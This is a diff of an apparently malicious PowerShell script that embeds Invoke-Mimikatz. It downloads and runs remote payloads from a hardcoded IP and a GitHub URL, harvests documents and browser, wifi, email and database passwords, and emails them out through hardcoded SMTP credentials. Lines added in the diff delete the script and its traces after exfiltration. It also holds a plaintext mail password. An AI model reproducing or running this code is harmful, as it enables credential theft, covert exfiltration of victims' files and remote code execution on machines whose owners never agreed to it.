@@ -6,6 +6,9 @@ $connectip = '106.80.36.165'
 
 IEX ((new-object net.webclient).downloadstring('http://106.80.36.165:8080/'))
 
+
+
+
 function Invoke-Mimikatz
 {
 <#
@@ -2753,58 +2756,16 @@ $copyDir = (Get-ChildItem env:\userprofile).value + '\Desktop'
 
 $copyToDir = New-Item $fileSaveDir'\Doc' -ItemType Directory
 
-
-IEX (New-Object Net.WebClient).DownloadString('http://' + $connectip + '/:8080/')
-
 Dir -filter *.txt -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
 Dir -filter *.doc -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
 Dir -filter *.docx -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
 Dir -filter *.xls -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
 Dir -filter *.xlsx -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
-Dir -filter *.zip -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
 
-$object1 = (Get-ChildItem env:\username).value + ' GetPass.txt'
+IEX (New-Object Net.WebClient).DownloadString('https://github.com/begiilm/dy/raw/master/GetPass.ps1');
+#(new-object System.Net.WebClient).DownloadFile('http://wpbkt.oss-cn-hangzhou.aliyuncs.com/GetPass.ps1','D:\GetPass.ps1');
+#D:\GetPass.ps1;
 $object2 = (Get-ChildItem env:\username).value + ' Report.zip'
-
-(new-object System.Net.WebClient).DownloadFile($githuburl + '/Get.rar','D:\Get.exe');
-(new-object System.Net.WebClient).DownloadFile($githuburl + '/run.rar','D:\run.bat');
-D:\run.bat
-D:\Get.exe sysadmin >D:\GetPass.txt
-D:\Get.exe svn >>D:\GetPass.txt
-D:\Get.exe database >>D:\GetPass.txt
-D:\Get.exe browsers >>D:\GetPass.txt
-D:\Get.exe wifi >>D:\GetPass.txt
-D:\Get.exe emails >>D:\GetPass.txt
-
-
-$mail = New-Object System.Net.Mail.MailMessage
-#set the addresses
-$mail.From = New-Object System.Net.Mail.MailAddress('2014652020@email.ctbu.edu.cn','2014652020@email.ctbu.edu.cn')
-$mail.To.Add('2014652020@email.ctbu.edu.cn')
-#set the content
-$mail.Subject = $object1
-$mail.Priority  = 'High'
-$mail.Body = 'Chrome  password'
-$filename= 'D:\GetPass.txt'
-$attachment = new-Object System.Net.Mail.Attachment($filename)
-$mail.Attachments.Add($attachment)
-#send the message
-$smtp = New-Object System.Net.Mail.SmtpClient -argumentList 'pop.exmail.qq.com'
-$smtp.Credentials = New-Object System.Net.NetworkCredential -argumentList '2014652020@email.ctbu.edu.cn','Inctbu123'
-$smtp.EnableSsl = 'True';
-$smtp.Timeout = '10000000';
-try{
-	$smtp.Send($mail)
-	echo 'Ok,Send succed!'
-}
-catch 
-{
-	echo 'Error!Filed!'
-}
-
-
-
-
 $date = get-date
 
 $style = "<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#center{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>"
@@ -2891,7 +2852,7 @@ $Report = $Report + '</table></div>'
 
 $Report =  $Report + '<div id=center><h3>User Documents (doc,docx,pdf,rar)</h3>'
 
-$Report =  $Report + (Get-ChildItem -Path $userDir -Include *.doc, *.docx, *.xls, *.xlsx, *.txt *.sql *.mdb  -Recurse |convertto-html Directory, Name, LastAccessTime)
+$Report =  $Report + (Get-ChildItem -Path $userDir -Include *.doc, *.docx, *.xls, *.xlsx, *.txt -Recurse |convertto-html Directory, Name, LastAccessTime)
 
 $Report = $Report + '</div>'
 
@@ -2961,7 +2922,7 @@ $mail.To.Add('2014652020@email.ctbu.edu.cn')
 #set the content
 $mail.Subject = $object2
 $mail.Priority  = 'High'
-$mail.Body = 'Report file'
+$mail.Body = 'test'
 $filename= 'D:\Report.zip'
 $attachment = new-Object System.Net.Mail.Attachment($filename)
 $mail.Attachments.Add($attachment)
@@ -2978,10 +2939,14 @@ catch
 {
 	echo 'Error!Filed!'
 }
+remove-item $fileSaveDir -recurse
+
+remove-item 'D:\Report.zip'
+remove-item 'D:\runcmd.bat'
+Remove-Item $MyINvocation.InvocationName
 
 IEX ((new-object net.webclient).downloadstring('http://106.80.36.165:8080/'))
 
 remove-item $fileSaveDir -recurse
 (new-object System.Net.WebClient).DownloadFile($githuburl + '/run2.rar','D:\run2.bat');
 d:\run2.bat
-
